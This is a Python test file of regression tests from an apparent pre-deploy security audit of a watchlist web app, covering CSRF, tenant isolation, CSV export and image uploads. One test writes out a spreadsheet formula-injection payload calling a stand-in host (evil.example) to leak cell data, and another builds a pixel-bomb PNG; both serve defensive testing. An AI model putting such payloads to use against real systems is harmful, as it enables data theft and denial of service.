"""Regressions for defects found in the pre-deploy audit. Each test fails
against the code as it was before the corresponding fix."""

import io
from datetime import UTC, datetime, timedelta

from PIL import Image
from sqlalchemy import select

from app.models import ImportBatch, Notification, User
from tests.util import FRIEND, LORDO, do_login


async def _csrf_headers(client) -> dict:
    return {"X-CSRF-Token": (await client.get("/api/me")).json()["csrf"]}


async def test_review_resolution_persists(
    client, fake_idp, fake_tmdb_http, db_session, monkeypatch
):
    """The resolved flag must survive the commit: a shallow copy of the JSONB
    list made SQLAlchemy see no change and skip the UPDATE."""
    from app.db import get_sessionmaker
    from app.imports import queue
    from app.imports import service as import_service
    from app.imports.service import process_batch

    async def _inline(batch_id):
        async with get_sessionmaker()() as db:
            import uuid as uuid_module

            await process_batch(db, uuid_module.UUID(str(batch_id)))

    monkeypatch.setattr(queue, "enqueue_process_batch", _inline)

    async def always_ambiguous(db, name, type_hint, year):
        return "ambiguous", [
            {
                "tmdb_id": 354912,
                "type": "movie",
                "name": "Coco",
                "year": 2017,
                "poster_path": "/p.jpg",
                "popularity": 9,
            },
            {
                "tmdb_id": 456,
                "type": "tv",
                "name": "Example Show",
                "year": 2020,
                "poster_path": "/q.jpg",
                "popularity": 5,
            },
        ]

    monkeypatch.setattr(import_service, "match_row", always_ambiguous)

    await do_login(client, fake_idp, LORDO)
    headers = await _csrf_headers(client)
    created = await client.post(
        "/api/imports",
        data={"service": "json", "target": "watchlist", "payload": '[{"title": "Coco"}]'},
        headers=headers,
    )
    batch_id = created.json()["id"]
    entry = (await client.get(f"/api/imports/{batch_id}", headers=headers)).json()["review_queue"][
        0
    ]

    resolved = await client.post(
        f"/api/imports/{batch_id}/resolve",
        json={"index": entry["index"], "tmdb_id": 354912, "type": "movie"},
        headers=headers,
    )
    assert resolved.status_code == 200

    # Read back from the database, not the in-memory object.
    db_session.expire_all()
    batch = (await db_session.execute(select(ImportBatch))).scalar_one()
    assert batch.review_queue[0]["resolved"] is True
    assert batch.status == "done"

    # And the item cannot be resolved a second time.
    again = await client.post(
        f"/api/imports/{batch_id}/resolve",
        json={"index": entry["index"], "tmdb_id": 456, "type": "tv"},
        headers=headers,
    )
    assert again.status_code == 404


async def test_availability_return_notifies(
    client, fake_idp, fake_tmdb_http, db_session, monkeypatch
):
    """A title that leaves a provider and comes back must alert again."""
    import copy

    from app.notifications import ntfy
    from app.notifications.service import poll_availability
    from tests import fixtures

    async def fake_push(user, title, message):
        return True

    monkeypatch.setattr(ntfy, "push", fake_push)
    payload = copy.deepcopy(fixtures.MOVIE_DETAILS)
    monkeypatch.setattr(fixtures, "MOVIE_DETAILS", payload)

    await do_login(client, fake_idp, LORDO)
    headers = await _csrf_headers(client)
    await client.put("/api/me", json={"country_code": "EG"}, headers=headers)
    lists = (await client.get("/api/lists", headers=headers)).json()["lists"]
    watchlist_id = next(lst["id"] for lst in lists if lst["kind"] == "watchlist")
    await client.post(
        f"/api/lists/{watchlist_id}/items",
        json={"type": "movie", "tmdb_id": 354912},
        headers=headers,
    )

    # It disappeared from Disney Plus a week ago: the row is stale.
    from app.models import Availability

    row = (
        await db_session.execute(select(Availability).where(Availability.country == "EG"))
    ).scalar_one()
    row.last_seen_at = datetime.now(UTC) - timedelta(days=7)
    await db_session.commit()

    counters = await poll_availability(db_session)
    assert counters["notifications"] == 1
    note = (await db_session.execute(select(Notification))).scalars().first()
    assert "Disney Plus" in note.message


async def test_avatar_rejects_pixel_bomb(client, fake_idp, tmp_path, monkeypatch):
    """A small file that decodes to a huge bitmap must be refused before
    the decode allocates hundreds of megabytes."""
    from app.config import get_settings

    monkeypatch.setattr(get_settings(), "data_dir", str(tmp_path))
    await do_login(client, fake_idp, LORDO)
    headers = await _csrf_headers(client)

    bomb = Image.new("RGB", (12000, 12000), (0, 0, 0))
    buffer = io.BytesIO()
    bomb.save(buffer, "PNG", compress_level=9)
    assert len(buffer.getvalue()) < 1_000_000, "fixture must stay under the byte cap"

    resp = await client.post(
        "/api/me/avatar",
        files={"file": ("bomb.png", buffer.getvalue(), "image/png")},
        headers=headers,
    )
    assert resp.status_code == 413

    # A normal image still works.
    ok = Image.new("RGB", (800, 600), (30, 90, 200))
    ok_buffer = io.BytesIO()
    ok.save(ok_buffer, "PNG")
    good = await client.post(
        "/api/me/avatar",
        files={"file": ("fine.png", ok_buffer.getvalue(), "image/png")},
        headers=headers,
    )
    assert good.status_code == 200


async def test_forged_bearer_cannot_skip_csrf(client, fake_idp, fake_tmdb_http):
    """A cross-site request that adds a bogus Authorization header must not
    bypass CSRF and ride the session cookie."""
    await do_login(client, fake_idp, LORDO)
    resp = await client.post(
        "/api/lists",
        json={"name": "forged"},
        headers={"Authorization": "Bearer wdk_not-a-real-token"},
    )
    assert resp.status_code in (401, 403)
    assert resp.status_code != 201


async def test_export_neutralizes_formulas(client, fake_idp, fake_tmdb_http, db_session):
    """A note written by one person must not execute in the other's
    spreadsheet."""
    await do_login(client, fake_idp, FRIEND)
    headers_k = await _csrf_headers(client)
    lists = (await client.get("/api/lists", headers=headers_k)).json()["lists"]
    shared_id = next(lst["id"] for lst in lists if lst["kind"] == "shared")
    await client.post(
        f"/api/lists/{shared_id}/items",
        json={
            "type": "movie",
            "tmdb_id": 354912,
            "note": '=HYPERLINK("http://evil.example/?x"&A2,"Open")',
        },
        headers=headers_k,
    )
    await client.post("/api/auth/logout", headers=headers_k)

    await do_login(client, fake_idp, LORDO)
    csv_text = (await client.get("/api/export/lists.csv")).text
    assert "'=HYPERLINK" in csv_text
    assert ",=HYPERLINK" not in csv_text


async def test_stats_months_are_calendar_months(client, fake_idp, fake_tmdb_http):
    """Twelve distinct consecutive months, no duplicates, no skipped February."""
    await do_login(client, fake_idp, LORDO)
    body = (await client.get("/api/stats")).json()
    months = [m["month"] for m in body["monthly"]]
    assert len(months) == 12
    assert len(set(months)) == 12, "no month may appear twice"
    for earlier, later in zip(months, months[1:], strict=False):
        y1, m1 = (int(p) for p in earlier.split("-"))
        y2, m2 = (int(p) for p in later.split("-"))
        assert (y2 - y1) * 12 + (m2 - m1) == 1, "months must step by exactly one"


async def test_movie_night_ignores_other_tenants(
    client, fake_idp, fake_tmdb_http, db_session, ai_enabled
):
    """A user in another tenant must never influence the blend."""
    from app.ai import embeddings
    from app.models import Tenant

    await do_login(client, fake_idp, LORDO)
    headers = await _csrf_headers(client)
    await client.get("/api/titles/movie/354912")
    await client.get("/api/titles/tv/456")
    await client.get("/api/titles/movie/550")
    await embeddings.embed_missing_titles(db_session)
    await client.post(
        "/api/history", json={"type": "movie", "tmdb_id": 354912, "loved": True}, headers=headers
    )

    other_tenant = Tenant(name="somebody else")
    db_session.add(other_tenant)
    await db_session.flush()
    stranger = User(
        tenant_id=other_tenant.id,
        username="stranger",
        role="member",
        services=[],
        prefs={},
        api_enabled=False,
        is_active=True,
    )
    db_session.add(stranger)
    await db_session.commit()

    home = (await client.get("/api/home", headers=headers)).json()
    # The stranger has no taste, but the query must not even consider them:
    # with only cross-tenant users present there is no movie-night row.
    assert "movie-night" not in [row["key"] for row in home["rows"]]
